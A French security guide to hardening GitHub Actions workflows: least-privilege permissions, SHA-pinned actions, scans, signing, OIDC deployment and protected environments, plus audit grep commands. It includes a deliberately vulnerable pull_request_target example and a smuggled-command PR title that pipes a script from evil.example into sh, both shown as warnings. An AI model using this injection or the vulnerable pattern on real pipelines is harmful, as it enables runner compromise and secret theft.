# GitHub Actions durci

## Workflow complet

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

# Défaut le plus restrictif au niveau du workflow ; chaque job élargit si besoin.
# Sans ce bloc, le jeton hérite des permissions par défaut du dépôt, souvent
# en écriture sur l'ensemble des scopes.
permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # ---------------------------------------------------------------- tests
  test:
    runs-on: ubuntu-latest
    # Aucun secret nécessaire : ce job peut tourner sur une contribution externe.
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false   # ne laisse pas le jeton dans .git/config

      - uses: actions/setup-node@<sha-complet> # v4
        with:
          node-version: '22'
          cache: npm

      - run: npm ci
      - run: npm run lint
      - run: npm test

  # ---------------------------------------------------------------- scans
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write     # requis uniquement pour publier du SARIF
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0         # gitleaks a besoin de l'historique complet
          persist-credentials: false

      - name: Secrets
        uses: gitleaks/gitleaks-action@<sha-complet>

      - name: Configuration et dépendances
        uses: aquasecurity/trivy-action@<sha-complet>
        with:
          scan-type: fs
          scanners: vuln,secret,misconfig
          severity: HIGH,CRITICAL
          exit-code: '1'
          format: sarif
          output: trivy.sarif

      - if: always()
        uses: github/codeql-action/upload-sarif@<sha-complet>
        with:
          sarif_file: trivy.sarif

  # --------------------------------------------------------- construction
  build:
    needs: [test, scan]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write            # OIDC : requis pour signer et pour assumer un rôle
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - uses: docker/setup-buildx-action@<sha-complet>

      - uses: docker/login-action@<sha-complet>
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # jeton éphémère du job

      - id: push
        uses: docker/build-push-action@<sha-complet>
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          provenance: true       # attestation de provenance SLSA
          sbom: true

      - name: Scan de l'image publiée
        uses: aquasecurity/trivy-action@<sha-complet>
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
          severity: HIGH,CRITICAL
          exit-code: '1'

      - name: Signature sans clé
        run: cosign sign --yes "ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}"

  # ---------------------------------------------------------- déploiement
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment: production      # règles de protection : approbateurs, branches, délai
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: aws-actions/configure-aws-credentials@<sha-complet> # v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: eu-west-3
          # Aucune clé d'accès : identifiants temporaires obtenus par échange OIDC.

      - name: Déploiement par digest
        env:
          DIGEST: ${{ needs.build.outputs.digest }}
        run: |
          aws ecs update-service --cluster prod --service mon-app --force-new-deployment
```

## `permissions` — ce que change chaque scope

Sans bloc `permissions`, le `GITHUB_TOKEN` reçoit les permissions par défaut du
dépôt ou de l'organisation, historiquement en écriture sur tous les scopes. Un job
compromis peut alors pousser du code, créer une release, ou publier un paquet.

| Scope | Accordé seulement si |
|---|---|
| `contents: write` | Le job crée un tag, une release, ou pousse un commit |
| `packages: write` | Le job publie une image ou un paquet |
| `id-token: write` | Le job utilise l'OIDC (cloud ou signature) |
| `pull-requests: write` | Le job commente ou étiquette une PR |
| `security-events: write` | Le job publie un rapport SARIF |
| `actions: write` | Presque jamais — permet de modifier des workflows |

Vérifier aussi le réglage de l'organisation : « Workflow permissions » doit être
sur lecture seule par défaut, et « Allow GitHub Actions to create and approve pull
requests » désactivé — sinon un workflow peut s'auto-approuver une PR.

## `pull_request` vs `pull_request_target`

| Déclencheur | Code exécuté | Secrets disponibles | Utilisation |
|---|---|---|---|
| `pull_request` | Celui de la PR | Non (depuis un fork) | Tests, lint, build — le cas normal |
| `pull_request_target` | Celui de la **base** | **Oui** | Étiquetage, commentaire — jamais de build |

`pull_request_target` combiné à un `checkout` de la branche proposée est la
vulnérabilité la plus documentée de la plateforme : le workflow de confiance
exécute du code non fiable avec les secrets du dépôt.

```yaml
# INTERDIT
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # code non fiable
      - run: npm ci && npm run build                       # scripts npm arbitraires
```

Si un job de confiance doit traiter le résultat d'une PR, utiliser le motif
`workflow_run` : le job non fiable construit sans secret et publie un artefact ; un
second workflow, déclenché à la fin du premier, lit l'artefact — sans jamais
exécuter le code de la PR.

## Injection de script

Toute valeur `${{ github.event.* }}` est interpolée **avant** l'exécution du
shell : la chaîne devient partie du script.

```yaml
# INTERDIT — le titre est écrit par l'auteur de la PR
- run: echo "PR : ${{ github.event.pull_request.title }}"
```

Un titre valant `"; curl evil.example/x.sh | sh; #` s'exécute sur le runner.

```yaml
# JUSTE — la valeur passe par l'environnement, jamais par le corps du script
- env:
    TITRE: ${{ github.event.pull_request.title }}
  run: echo "PR : $TITRE"
```

Champs concernés : `title`, `body`, `head_ref`, `comment.body`, `issue.title`,
`commit.message`, `author.email`, les noms de branches et de tags. Règle simple :
aucun `${{ github.event.* }}` dans un `run:`, jamais.

## Épinglage des actions

```yaml
- uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
```

Le tag `v4` est déplaçable par le mainteneur du dépôt d'action ; le SHA ne l'est
pas. Des compromissions d'actions populaires ont diffusé des charges utiles
d'exfiltration de secrets à toutes les organisations qui les référençaient par tag.

Résolution du SHA, avec vérification du type de l'objet :

```bash
curl -sS -H 'Accept: application/vnd.github+json' \
  https://api.github.com/repos/actions/checkout/git/ref/tags/v4
# "object": { "sha": "...", "type": "commit" }  -> épingler ce sha
# "type": "tag" (tag annoté)                    -> déréférencer object.url d'abord
```

Compléments organisationnels :
- Restreindre les actions autorisées (Paramètres → Actions → « Allow select
  actions ») aux actions vérifiées et à une liste explicite.
- Activer Dependabot sur `github-actions` pour que l'épinglage reste à jour.
- Ne jamais utiliser une action d'un compte personnel sur un workflow qui touche
  la production, sauf audit du code et épinglage.

## Environnements protégés

L'environnement est le point où s'attachent l'approbation humaine, la restriction
de branches et les secrets de production.

- **Required reviewers** : au moins une approbation nominative avant l'exécution.
- **Deployment branches** : seule la branche par défaut peut déployer.
- **Wait timer** : délai avant exécution, fenêtre pour annuler.
- **Environment secrets** : les identifiants de production ne sont lisibles que par
  les jobs liés à cet environnement.

Un job sans `environment:` ne bénéficie d'aucune de ces protections, même si le
dépôt en définit.

## Sécurité du dépôt, hors workflow

- Branche par défaut protégée : revue obligatoire, vérifications de statut
  requises, poussée forcée interdite, suppression interdite.
- Commits signés exigés sur la branche protégée.
- `CODEOWNERS` couvrant `.github/workflows/` : une modification de pipeline est un
  changement de sécurité et exige la revue de la même équipe que l'infrastructure.
- Auto-hébergement de runners : jamais sur un dépôt public. Un runner
  auto-hébergé exécute le code de toute PR ouverte par n'importe qui, sur une
  machine de l'organisation, et son système de fichiers persiste entre les jobs.

## Contrôles rapides

```bash
# Actions non épinglées
grep -rnE 'uses:\s*[^@]+@(v[0-9]+|main|master)\b' .github/workflows/

# Déclencheurs à risque
grep -rn 'pull_request_target' .github/workflows/

# Interpolation d'entrée utilisateur dans un run
grep -rnE 'run:.*\$\{\{\s*github\.event\.' .github/workflows/

# Workflows sans bloc permissions
for f in .github/workflows/*.y*ml; do grep -q 'permissions:' "$f" || echo "SANS PERMISSIONS: $f"; done
```
